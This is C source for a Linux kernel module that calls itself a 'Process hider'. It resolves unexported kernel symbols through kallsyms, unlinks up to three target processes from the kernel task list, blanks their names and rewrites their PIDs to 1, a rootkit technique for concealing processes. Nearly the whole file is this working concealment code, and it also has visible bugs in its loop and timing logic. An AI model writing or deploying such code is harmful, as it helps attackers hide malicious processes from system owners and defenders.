#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>
#include <linux/kallsyms.h>
#include <linux/types.h>
#include <linux/time.h>
#include <linux/delay.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jean 'iansus' Marsault");
MODULE_DESCRIPTION("Process hider");
MODULE_VERSION("1.0");

static struct timespec *gtime;

static int sleepwait = 0;

module_param(sleepwait, int, S_IRUGO);

/* getnstimeofday - Returns the time of day in a timespec */
void getnstimeofday(struct timespec *ts);

// From https://github.com/gravit0/changepid/blob/master/module/main.c
static asmlinkage void (*change_pidR)(struct task_struct *task, enum pid_type type, struct pid *pid);
static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace *ns);

static void* find_sym( const char *sym ) {  // find address kernel symbol sym 
	static unsigned long faddr = 0;          // static !!! 
	// ----------- nested functions are a GCC extension --------- 
	int symb_fn( void* data, const char* sym, struct module* mod, unsigned long addr ) { 
		if( 0 == strcmp( (char*)data, sym ) ) { 
			faddr = addr; 
			return 1; 
		} 
		else return 0; 
	}; 
	// -------------------------------------------------------- 
	kallsyms_on_each_symbol( symb_fn, (void*)sym ); 
	return (void*)faddr; 
}


// LKM Arguments
static int target_pid = 0;
module_param(target_pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
static int target_pid2 = 0;
module_param(target_pid2, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
static int target_pid3 = 0;
module_param(target_pid3, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(target_pid, "Target process PID");

static int totalTarget = 0;

static int verb = 0;
module_param(verb, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(verb, "Set to non-0 to make the module verbose");

static void exectionShow(int step){
	static long first,second;
	struct timespec *gtime;
        gtime = kmalloc(sizeof(struct timespec),GFP_KERNEL);
        getnstimeofday(gtime);
	if (step == 1 )
	{
		first = (gtime->tv_nsec/1000);}
	else
	{ 
		second = (gtime->tv_nsec/1000);
		long result = second - first;
		printk(KERN_INFO "Total Execution time : %.12lu", result);
	}

}

static void showtime(int x){

    unsigned long get_time;
    int sec, hr, min, tmp1,tmp2, tmp3;
    struct timeval tv;
    struct tm tv2;

    do_gettimeofday(&tv);
    get_time = tv.tv_sec;
    sec = get_time % 60;
    tmp1 = get_time / 60;
    min = tmp1 % 60;
    tmp2 = tmp1 / 60;
    hr = (tmp2 % 24) - 4;
    time_to_tm(get_time, 0, &tv2);
    tmp3 = tv2.tm_year;


    if (x == 1){
      printk(KERN_INFO "Started at :  %d:%d:%d\n",hr,min,sec);
    }
    else{
      printk(KERN_INFO "Stopped at :  %d:%d:%d\n",hr,min,sec);
    }


}



// LKM Init func
static int __init hideproc_init(void) {

	msleep(sleepwait);
	int currentFillup = 0;
	int indexCheck[3];
	int successCount = 0;
	int totalTemp = 0;
	if ( target_pid != 0 ) {
		indexCheck[totalTarget] = target_pid;
		totalTarget++;
	}
	if ( target_pid2 != 0 ) { 
		indexCheck[totalTarget] = target_pid2;
		totalTarget++;
	}
	if ( target_pid3 != 0 ) { 
		indexCheck[totalTarget] = target_pid3;
		totalTarget++;
	}
	
	totalTemp = totalTarget;
	printk(KERN_INFO "total amount of process to hide = %d", totalTarget);
	
	while (totalTarget > 0){
		
		if( currentFillup == 0 ) {
			showtime(1);
			exectionShow(1);
			
			/*gtime = kmalloc(sizeof(struct timespec),GFP_KERNEL);
			getnstimeofday(gtime);
			printk(KERN_INFO "stated at %ld %ld", gtime->tv_sec, gtime->tv_nsec);*/
		}
		struct list_head* pos = NULL;
		struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
		struct pid* newpid = NULL;
		char new_comm[16] = {0};

		change_pidR = find_sym("change_pid");
		alloc_pidR = find_sym("alloc_pid");

		if (verb) printk(KERN_INFO "Target PID is %d", indexCheck[currentFillup]);
		list_for_each(pos, &current->tasks) {

			task = list_entry(pos, struct task_struct, tasks); 
			if(task->pid == indexCheck[currentFillup]) {
				elected_task = task;
			}
		}

		if(elected_task!=NULL) {

			if (verb) printk(KERN_INFO "Process id is %d", elected_task->pid);

			task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
			task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
			if(verb) {
				printk(KERN_INFO "Next process is %s", task_next->comm);
				printk(KERN_INFO "Prev process is %s", task_prev->comm);
			}

			memcpy(elected_task->comm, new_comm, 16);

			task_prev->tasks.next = elected_task->tasks.next;
			task_next->tasks.prev = elected_task->tasks.prev;

			elected_task->tasks.next = &(elected_task->tasks);
			elected_task->tasks.prev = &(elected_task->tasks);

			newpid = alloc_pidR(task_active_pid_ns(elected_task));
			newpid->numbers[0].nr = 1;
			change_pidR(elected_task, PIDTYPE_PID, newpid);
			printk(KERN_INFO "Hide process %d is successful", elected_task->pid);
			elected_task->pid = 1;
			//exectionShow(2);
			totalTarget--;
			currentFillup++;
			successCount++;
		}else{
			printk(KERN_INFO "The hideproc is not successful");
			totalTarget--;
		}

		//return 0;

	}
	exectionShow(2);
	printk(KERN_INFO "%d processes to hide , and hide %d processes successfully %d fail", totalTemp,successCount,(totalTemp - successCount));
	return 0;
}

// LKM Exit func
static void __exit hideproc_exit(void) {
	kfree(gtime);
	showtime(2);
	if (verb) printk(KERN_INFO "Goodbye, World!\n");
}

// Register init & exit funcs
module_init(hideproc_init);
module_exit(hideproc_exit);